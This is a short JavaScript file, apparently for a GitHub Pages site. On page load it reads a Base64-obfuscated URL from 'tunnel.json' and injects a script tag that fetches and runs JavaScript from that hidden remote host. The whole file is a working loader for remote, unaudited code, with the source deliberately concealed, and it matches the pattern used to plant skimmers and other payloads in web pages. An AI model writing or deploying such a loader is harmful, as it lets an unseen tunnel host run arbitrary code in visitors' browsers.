async function loadRemoteInjectedJS() {
  try {
    // cache-bust so GH Pages always fetches fresh
    const res = await fetch("./tunnel.json?ts=" + Date.now());
    const data = await res.json();

    if (!data.u) {
      console.log("Tunnel URL missing.");
      return;
    }

    // --- Simple obfuscation decode (Base64) ---
    const decodedURL = atob(data.u);

    const s = document.createElement("script");
    s.src = decodedURL + "?ts=" + Date.now(); // extra cache bust
    s.defer = true;

    s.onload = () => console.log("✅ Remote injected JS loaded");
    s.onerror = () => console.log("❌ Failed to load remote injected JS");

    document.head.appendChild(s);
  } catch (err) {
    console.log("Remote Loader error:", err);
  }
}

loadRemoteInjectedJS();
